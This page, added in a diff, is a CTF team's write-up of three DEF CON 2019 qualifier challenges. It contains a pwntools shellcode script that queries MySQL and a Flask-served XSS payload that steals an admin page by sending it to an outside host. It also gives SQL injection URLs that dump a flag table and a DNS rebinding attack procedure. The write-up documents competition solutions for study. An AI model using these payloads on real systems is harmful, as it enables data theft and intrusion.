@@ -1,0 +1,439 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>DEF CON CTF Qualifier 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#return_to_shellql">return_to_shellql</a>
+    
+                <a class="dropdown-item" href="#ooops">ooops</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#redacted-puzzle">redacted-puzzle</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#return_to_shellql" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">return_to_shellql</span>
+            </a>
+    
+<a href="#ooops" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ooops</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#redacted-puzzle" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">redacted-puzzle</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="def-con-ctf-qualifier-2019"><a class="header-link" href="#def-con-ctf-qualifier-2019"></a>DEF CON CTF Qualifier 2019</h1>
+<p>This writeup is written by HITCON⚔BFKinesiS. We attended DEFCON CTF Qual as an joint team HITCON⚔BFKinesiS (HITCON, Balsn, BambooFox, DoubleSigma and KerKerYuan) this year.</p>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="return_to_shellql"><a class="header-link" href="#return_to_shellql"></a>return_to_shellql</h3>
+<p>This is the most disappointing and astonishing challenge in this year&#39;s DEFCON qual.</p>
+<p>We have the source code of the server:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/php-cgi</span>
+<span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>]))
+{
+   show_source(<span class="hljs-keyword">__FILE__</span>);
+   <span class="hljs-keyword">exit</span>();
+}
+
+$link = mysqli_connect(<span class="hljs-string">'127.0.0.1:31337'</span>, <span class="hljs-string">'shellql'</span>, <span class="hljs-string">'shellql'</span>, <span class="hljs-string">'shellql'</span>);
+
+<span class="hljs-comment">//sleep(300);</span>
+
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'shell'</span>]))
+{
+   $hexdshell = bin2hex($_POST[<span class="hljs-string">'shell'</span>]);
+   $txt = <span class="hljs-string">"HERE is shell length = "</span> . (strlen($hexdshell)/<span class="hljs-number">2</span>) . <span class="hljs-string">"-----------------------------\n"</span> . $hexdshell . <span class="hljs-string">"\n------------------------------\n"</span>;
+   $myfile = file_put_contents(<span class="hljs-string">'/tmp/logs.txt'</span>, $txt.PHP_EOL , FILE_APPEND | LOCK_EX);
+   fwrite($myfile, $txt);
+   fclose($myfile);
+
+   <span class="hljs-keyword">if</span> (strlen($_POST[<span class="hljs-string">'shell'</span>]) &lt;= <span class="hljs-number">1000</span>)
+   {
+          <span class="hljs-keyword">echo</span> $_POST[<span class="hljs-string">'shell'</span>];
+          shellme($_POST[<span class="hljs-string">'shell'</span>]);
+   }
+   <span class="hljs-keyword">exit</span>();
+}</code></pre><p>The <code>shellme()</code> is implemented as a php extension. We also have the binary <code>shellme.so</code>. Basically it will execute shellcode with <a href="https://en.wikipedia.org/wiki/Seccomp">seccomp</a> protection.</p>
+<p>The description of the challenge mentions the flag is in <code>/flag</code>, so we probably need local file inclusion or RCE to read the flag. Because seccomp is enabled when executing the shellcode, we can only read/write the file descriptors that are already opened:</p>
+<ol start="0">
+<li>stdin</li>
+<li>stdout</li>
+<li>stderr</li>
+<li><code>/tmp/.ZendSem.jTNX5u</code>: it&#39;s opend as RW, which seems to be a php temp file.</li>
+<li>MySQL socket</li>
+</ol>
+<p>The only fd that could be used to read loca files will be MySQL. Can we use MySQL to read <code>/flag</code>? Let&#39;s first run a few queries thorugh this shellcode:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python2</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> string
+
+context(arch=<span class="hljs-string">'amd64'</span>, os=<span class="hljs-string">'linux'</span>)
+query = <span class="hljs-string">'\x03'</span> + sys.argv[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> raw_input(<span class="hljs-string">'&gt; '</span>)
+packet = p32(len(query)) + query
+stdout = <span class="hljs-number">1</span>
+sql_fd = <span class="hljs-number">4</span>
+payload  = shellcraft.echo(<span class="hljs-string">'\n'</span>, stdout) <span class="hljs-comment"># for 200 response</span>
+payload += shellcraft.pushstr (packet)
+payload += shellcraft.write(sql_fd, <span class="hljs-string">'rsp'</span>, len(packet))
+payload += shellcraft.read(sql_fd, <span class="hljs-string">'rsp'</span>, <span class="hljs-number">10000</span>)
+payload += shellcraft.write(stdout, <span class="hljs-string">'rsp'</span>, <span class="hljs-string">'rax'</span>)
+shellcode = asm(payload)
+url = <span class="hljs-string">"http://shellretql.quals2019.oooverflow.io:9090/cgi-bin/index.php"</span> 
+r = requests.post(url, data={<span class="hljs-string">'shell'</span>: shellcode})
+
+<span class="hljs-keyword">print</span> repr(r.text)
+<span class="hljs-keyword">print</span>
+printable = set(string.printable) - set(<span class="hljs-string">'\x0c\x0b'</span>)
+<span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.join([i <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> printable <span class="hljs-keyword">else</span> <span class="hljs-string">' '</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r.text])</code></pre><ul class="list">
+<li>The <code>shellql</code> db contains nothing interesting</li>
+<li><code>show grants;</code> Permission: select and usage. Almost the same as read-only.</li>
+<li><code>select @@version</code>: 5.7.26-0ubuntu0.18.04.1, latest</li>
+</ul>
+<p>Then we tried various approaches to load file in MySQL, but all failed.</p>
+<ul class="list">
+<li>XXE in <code>LOAD XML</code>: MySQL doesn&#39;t parse external entities.</li>
+<li><code>LOAD_FILE()</code>/ <code>LOAD DATA INFILE</code>: We don&#39;t have file permission and we need to bypass <code>secure_file_priv</code>.</li>
+<li><a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html">Client-side arbitrary file inclusion <code>LOCAL INFLE</code></a>: This aims to read clients files. We don&#39;t have a MySQL client here.</li>
+<li>Rather than MySQL query, use other MySQL protocol to open files: <a href="https://mariadb.com/kb/en/library/com_binlog_dump/">COM_BINLOG_DUMP</a> , but we don&#39;t have REPLICATION SLAVE privilege</li>
+<li><code>select * from information_schema.processlist</code>: we can peek other team&#39;s queries</li>
+<li>become root via <code>auth_socket</code>: nope</li>
+<li>guessing root&#39;s password through <code>COM_CHANGE_USER</code> command: since the firstblood solved this challenge in 50 minutes, and this is DEFCON Qual, we don&#39;t think it&#39;s about guessing password </li>
+</ul>
+<p>In addition, the file operation of <code>logs.txt</code> does not make any sense here:</p>
+<pre class="hljs"><code>   $myfile = file_put_contents(<span class="hljs-string">'/tmp/logs.txt'</span>, $txt.PHP_EOL , FILE_APPEND | LOCK_EX);
+  fwrite($myfile, $txt);
+  fclose($myfile);</code></pre><p>The return value of <code>file_put_contents</code> is how many bytes are written, instead of a file resource. Even it could <a href="https://www.php.net/manual/en/function.file-put-contents.php">return boolean false</a>, according to <a href="https://lxr.room11.org/xref/php-src%40master/Zend/zend_API.h#zend_parse_arg_resource">php src</a>, both <code>fwrite</code> and <code>fclose</code>  will check the argument type.</p>
+<p>We stuck here for more than 36 hours, and the challenge is still solved by only one team: how can <em>SeoulPlusBadAss</em> got firstblood in just 50 minutes?</p>
+<p>10 hours left for the qualification, suddenly in IRC:</p>
+<pre class="hljs"><code>ATTENTION: SeoulPlusBadAss, please PM <span class="hljs-keyword">me</span> ASAP <span class="hljs-built_in">or</span> you will just <span class="hljs-keyword">be</span> unhappy <span class="hljs-keyword">later</span></code></pre><p>Interesting. Did they screw up this challenge or made it unsolvable? Soon after the challenge was in maintenance and unstable for about an hour. I was still dumping <code>processlist</code> and hope to discover some interesting payload, only to found a fake flag. </p>
+<p>Because I think it&#39;s fake. I didn&#39;t expect this challenge could be solved by just dumping payloads. So I don&#39;t even try to submit this one. However, this fake flag did make me curious because it didn&#39;t follow MySQL&#39;s response protocol. The header was missing. I wondered if the MySQL was pwned. </p>
+<pre class="hljs"><code><span class="hljs-number">16</span>:<span class="hljs-number">16</span> &lt;@zardus&gt; ATTENTION HACKERS! We've undone massive horizontal scaling <span class="hljs-keyword">of</span> shellretql <span class="hljs-keyword">in</span> favor <span class="hljs-keyword">of</span> massive vertical scaling. Though our test exploits have been successfully landing <span class="hljs-keyword">on</span> this service <span class="hljs-keyword">the</span> whole CTF, this change more closely replicates conditions when <span class="hljs-keyword">it</span> <span class="hljs-keyword">first</span> launched. HACK IT!
+
+Hash <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> flag: <span class="hljs-number">9214822</span>b06e543db1bd94951e0955d1e0899bce16b490c18cd35ef8cd8d21c432424fa19c94e1c75b375db162371c9c5f39ec894890861e6cbcdc57833ef9813</code></pre><p>Then in the next 30 minutes, 7 teams solved this chalenge. Okay okay let&#39;s try <code>select * from information_schema.processlist;</code> again to dump other team&#39;s payload. It turned out that the previous fake flag I found is actually the real flag...... WTF......</p>
+<p>Meanwhile, on our team&#39;s Slack, there are numerous <code>WTF?</code> <code>????</code> <code>XD</code> when someone submited it. Actually I solved this challenge two hour ago. I even copied the flag but I was too lazy to submit it.</p>
+<p>There is an <a href="https://twitter.com/oooverflow/status/1127740964754186240">offcial twitter post</a> explaining what happened to this challenge.</p>
+<h3 id="ooops"><a class="header-link" href="#ooops"></a>ooops</h3>
+<blockquote>
+<p>Solved by: bookgin, Kaibro, seadog007, k1tten</p>
+</blockquote>
+<h4 id="solution-1:-xss"><a class="header-link" href="#solution-1:-xss"></a>Solution 1: XSS</h4>
+<p>In this challenge, we&#39;re given a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_(PAC">proxy PAC file</a>_file). It&#39;s used to automatically determine the request should be proxied or not.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FindProxyForURL</span>(<span class="hljs-params">url, host</span>) </span>{
+ <span class="hljs-comment">/* The only overflow employees can access is Order of the Overflow. Log in with OnlyOne:Overflow */</span>
+ <span class="hljs-keyword">if</span> (shExpMatch(host, <span class="hljs-string">'oooverflow.io'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">'DIRECT'</span>;<span class="hljs-keyword">return</span> <span class="hljs-string">'PROXY ooops.quals2019.oooverflow.io:8080'</span>;
+}</code></pre><p>We launch Chromium with this proxy server and try to visit oooverflow.io:</p>
+<pre class="hljs"><code># Chromium will ask <span class="hljs-keyword">for</span> the credentials. <span class="hljs-keyword">Log</span> <span class="hljs-keyword">in</span> with OnlyOne:Overflow <span class="hljs-keyword">as</span> documented <span class="hljs-keyword">in</span> the <span class="hljs-keyword">PAC</span> <span class="hljs-keyword">file</span>.
+$ chromium --proxy-server=<span class="hljs-string">"ooops.quals2019.oooverflow.io:8080"</span> <span class="hljs-string">"http://oooverflow.io"</span></code></pre><p>The proxy returns a webpage saying &quot;<a href="http://oooverflow.io">http://oooverflow.io</a> is blocked.&quot; We can also submit a link to admin to send a site unblock request.</p>
+<p>After a few trial and error, we observe:</p>
+<ol class="list">
+<li>If the url contains <code>oooverflow</code> (excluding the GET parameter), the page will be blocked.</li>
+<li>On the block page, there is a XSS vulnerability. <code>http://oooverflow.io/&lt;img src=x&gt;</code></li>
+<li>The admin will visit the URL in the site unblock request. The referer in the HTTP header is <code>http://10.0.1.81:5000/admin/view/19</code>.</li>
+<li>The admin&#39;s UA is <code>Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</code>. This does not support some js syntax like <code>fetch()</code>, <code>let i = 0</code>.</li>
+</ol>
+<p>The objective is clear: stealing the data in <code>http://10.0.1.81:5000/</code>.</p>
+<p>Leveraging 1 &amp; 3, we can forge a url <code>http://10.0.1.81:5000/oooverflow/&lt;img src=x&gt;</code> including our XSS payload and send to admin. Since the page will be blocked, it will trigger our XSS payload. Additionally, the url is the same origin as <code>http://10.0.1.81:5000/</code>. We are allowed to read arbitrary content on the origin.</p>
+<p>However, the XSS payload will be split 55 characters. The js in the page will insert annoying <code>&lt;br/&gt;</code>.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">split_url</span>(<span class="hljs-params">u</span>) </span>{
+    u = <span class="hljs-built_in">decodeURIComponent</span>(u); <span class="hljs-comment">// Stringify</span>
+    output = u[<span class="hljs-number">0</span>];
+    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">1</span>;i&lt;u.length;i++) {
+        output += u[i]
+        <span class="hljs-keyword">if</span> (i%<span class="hljs-number">55</span>==<span class="hljs-number">0</span>) output+= <span class="hljs-string">"&lt;br/&gt;"</span>;
+    }
+    <span class="hljs-built_in">console</span>.log(output)
+    <span class="hljs-keyword">return</span> output
+}
+<span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{
+    d = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"blocked"</span>);
+    d.innerHTML=(split_url(<span class="hljs-built_in">document</span>.location) + <span class="hljs-string">" is blocked"</span>)
+}</code></pre><p>This could be simply bypassed via js comment <code>/*&lt;br/&gt;*/</code>, or using <code>location.hash</code> to chain longer payloads. Another annoying one is the admin will change his internal IP every minutes. <code>10.0.1.101:5000</code>,<code>10.0.1.81:5000</code> .... but at least we can dynamically determine which URL to redirect based on the referer header.</p>
+<p>Here is my HTTP server, including the XSS payload:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect
+<span class="hljs-keyword">import</span> base64
+
+app = Flask(__name__)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genurl</span><span class="hljs-params">(ip)</span>:</span> <span class="hljs-comment"># e.g. 10.1.2.3:5000</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64e</span><span class="hljs-params">(x)</span>:</span>
+        <span class="hljs-keyword">return</span> base64.b64encode(x.encode()).decode()
+
+    host = <span class="hljs-string">'http://'</span>+ip+<span class="hljs-string">'/oooverflow'</span>
+
+    js = <span class="hljs-string">'''
+var snd = function(data) {
+document.getElementsByTagName('body')[0].appendChild(document.createElement('img')).src='http://example.com:5000/a?'+data;
+}
+
+setInterval(function(){snd('ping');},500+500);
+
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+if (xhr.readyState == XMLHttpRequest.DONE) {
+var txt = xhr.responseText;
+snd(btoa(txt));
+}
+}
+xhr.open('GET', 'http://REPLACEME/admin/view/1', true);
+xhr.send(null);
+'''</span>.replace(<span class="hljs-string">'REPLACEME'</span>, ip)
+
+    <span class="hljs-keyword">assert</span> <span class="hljs-string">'"'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> js
+    b64_js = b64e(js)
+
+    xss = <span class="hljs-string">'&lt;img src=x onerror="eval(atob(\'{}\'))"&gt;'</span>.format(b64_js)
+    delimeter = <span class="hljs-string">"'/**/+'"</span>
+    payload = <span class="hljs-string">'bbbb'</span> <span class="hljs-comment"># shift 4 bytes</span>
+    delta = <span class="hljs-number">55</span> - len(delimeter)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(xss), delta):
+        print(xss[i:i+delta] + delimeter)
+        payload += xss[i:i+delta] + delimeter
+    payload = payload[:-len(delimeter)] <span class="hljs-comment"># remove last delimeter</span>
+    payload = host.ljust(<span class="hljs-number">56</span>, <span class="hljs-string">'a'</span>) + payload
+    <span class="hljs-keyword">return</span> payload
+
+<span class="hljs-meta">@app.route('/')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+    ip = request.environ.get(<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>).rsplit(<span class="hljs-string">','</span>)[<span class="hljs-number">-1</span>]
+    ip = ip + <span class="hljs-string">':5000'</span>
+    <span class="hljs-keyword">return</span> redirect(genurl(ip), code=<span class="hljs-number">302</span>)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.run(port=<span class="hljs-number">5000</span>, host=<span class="hljs-string">"0.0.0.0"</span>)</code></pre><p>However, the <code>http://10.0.1.81:5000/</code> page has nothing interesting at all. <code>http://10.0.1.81:5000/admin/view/19</code> contains a suspicious HTML comment: <code>&lt;!-- Query: select rowid,* from requests where rowid=2; --&gt;</code></p>
+<p>This is obviously a SQL injection hint. The rest is a simple SQLi challenge. @kaibro solved the rest.</p>
+<p>Visit: <code>/admin/view/1 order by 10</code></p>
+<p>We will get <code>SQL Error: 1st ORDER BY term out of range - should be between 1 and 5</code>.</p>
+<p>From this error message, we know it is SQLite db and the column number is 5.</p>
+<p>Then dump the table structure: <code>/admin/view/1 and 1=2 union select 1,2,3,sql,5 from sqlite_master where type=&#39;table&#39;</code></p>
+<p>=&gt; <code>CREATE TABLE flag (name TEXT, flag TEXT)</code></p>
+<p>Dump flag: <code>/admin/view/1 and 1=2 union select 1,2,3,flag,5 from flag</code>:</p>
+<p>=&gt; <code>OOO{C0rporateIns3curity}</code></p>
+<h4 id="solution-2:-dns-rebinding"><a class="header-link" href="#solution-2:-dns-rebinding"></a>Solution 2: DNS rebinding</h4>
+<p>Because the internal server does not validate HTTP host header, it&#39;s also worth mentioning that DNS rebinding can also be used to solve this challenge. It should work but I fail to reproduce because the admin&#39;s internal URL is changing so fast. That leads to a low successful rate of DNS rebinding. (In the earlier the challange is protected with recaptcha, and admin seems to change internal IP address every a few minutes. After the recaptcha is removed, the internal IP keeps changing every request we sent.) The attack procedure is listed as follows:</p>
+<ol class="list">
+<li>Set up our evil website and listen on <code>240.240.240.240:5000/admin/view/SQLi</code>.</li>
+<li>Set up a DNS server resolving <code>example.com</code> randomly to <code>A 240.240.240.240</code>  or <code>A 10.0.1.81</code> with TTL = 0. Note that you cannot resolve it to two A records. The browser will always resolve to the private IP first. </li>
+<li>Send the crafted SQL injection link <code>http://example.com:5000/admin/view/SQLi</code> to admin.</li>
+<li>If we are lucky enough, it will resolve to our evil website <code>240.240.240.240</code>.</li>
+<li>On our evil website, the js will send multiple XHR request to <code>example.com:5000/admin/view/SQLi</code> and read the response text.</li>
+<li>If we are lucky enough, the address will resolve to <code>10.0.1.81</code>. Sincer the origin is still <code>example.com:5000</code>, we don&#39;t violate the same-origin policy. We can easily extract the flag.</li>
+</ol>
+<p>For more information about browser bahaviors regarding DNS rebinding please read <a href="https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/#attack-scenario">@bookgin&#39;s article</a>. </p>
+<h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed Attempts</h4>
+<ul class="list">
+<li><a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/">PhantomsJS local file inclusion</a>: @vtim found PhantomJS has to visit <code>file:///</code> protocol such that the local file will be the same origin, but in this challenge it&#39;s visiting <code>http://</code> protocol. We cannot read local files by this approach.</li>
+<li>DNS rebinding: Actually this should not be considered as failed attempts. We use DNS rebinding technique to read the content of <code>http://10.0.1.81:5000/</code> and <code>http://10.0.1.81:5000/admin/view/19</code>. Unfortunately we didn&#39;t notice the HTML comment.</li>
+</ul>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="redacted-puzzle"><a class="header-link" href="#redacted-puzzle"></a>Redacted-Puzzle</h3>
+<p>In this challenge, we&#39;re given a black gif picture.</p>
+<p>We can extract every frame from this gif file by any online gif tool.</p>
+<p>Using StegSolver, we will find out these polygons for every frame images as below:</p>
+<p class="img-container"><img src="https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/puzzle.png" alt=""></p>
+<p>And first frame image tell us the flag alphabet: <code>+-=ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}</code></p>
+<p class="img-container"><img src="https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/0.png" alt=""></p>
+<p><br></p>
+<p>After observation, we found that polygons have some special features, e.g. there is only 3~5 length type of edges.</p>
+<p>So we guess it seems like to choose some points from Octagonal and connect each point to draw these polygons.</p>
+<p class="img-container"><img src="https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/ori.png" alt=""></p>
+<p class="img-container"><img src="https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/ori2.png" alt=""></p>
+<p class="img-container"><img src="https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/ori3.png" alt=""></p>
+<p>if the selected point is regarded as 1 and the remaining points are treated as 0, watch clockwise from the top left</p>
+<p>we will get the following bit string:</p>
+<p>0.png: <code>10001100</code></p>
+<p>1.png: <code>01100011</code></p>
+<p>...</p>
+<p>and the repeated binary <code>10001</code> is equal to decimal <code>17</code>.</p>
+<p><code>alphabet[17] = &#39;O&#39;</code></p>
+<p>These repeated <code>O</code> looks like the prefix of the flag.</p>
+<p>So our target is to collect every 8 bits from all frame images and divide them into groups of 5.</p>
+<p>The only thing to note is that each image will rotate slightly counterclockwise.</p>
+<p><code>OOO{FORCES-GOVERN+TUBE+FRUIT_GROUP=FALLREMEMBER_WEATHER}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
